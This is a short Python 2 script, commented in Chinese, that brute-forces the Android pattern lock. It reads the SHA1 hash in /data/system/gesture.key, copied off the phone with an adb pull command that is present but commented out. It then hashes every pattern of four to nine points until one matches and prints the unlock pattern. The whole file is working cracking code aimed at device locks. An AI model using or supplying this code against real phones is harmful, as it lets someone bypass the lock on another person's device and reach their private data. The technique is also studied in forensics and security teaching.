# -*- coding: cp936 -*-
import itertools
import hashlib
import time
import os

# python2.x版本
def getPassword():
    #调用cmd，ADB连接到手机,读取SHA1加密后的字符串
    # os.system("adb pull /data/system/gesture.key gesture.key")
    # time.sleep(5)
    f=open('gesture.key','r')
    pswd=f.readline()
    f.close()
    pswd_hex=pswd.encode('hex')
    print u'加密后的密码为：%s'%pswd_hex

    #生成解锁序列，得到['00','01','02','03','04','05','06','07','08']
    matrix=[]
    for i in range(0,9):
        str_temp = '0'+str(i)
        matrix.append(str_temp)

    #将00——08的字符进行排列，至少取4个数排列，最多全部进行排列

    min_num=4
    max_num=len(matrix)

    for num in range(min_num,max_num+1):#从04 -> 08
        iter1 = itertools.permutations(matrix,num)#从9个数字中挑出n个进行排列
        list_m=[]
        list_m.append(list(iter1))#将生成的排列全部存放到 list_m 列表中
        for el in list_m[0]:#遍历这n个数字的全部排列
            strlist=''.join(el)#将list转换成str。[00,03,06,07,08]-->0003060708
            strlist_sha1 = hashlib.sha1(strlist.decode('hex')).hexdigest()#将字符串进行SHA1加密
            if pswd_hex==strlist_sha1:#将手机文件里的字符串与加密字符串进行对比
                print u'解锁密码为：',strlist

if __name__ == '__main__':
    print u'解密开始：'
    startTimes = time.time()
    getPassword()
    endTimes = time.time()
    times = endTimes - startTimes
    print u'共耗时：' , repr(times) , u'秒'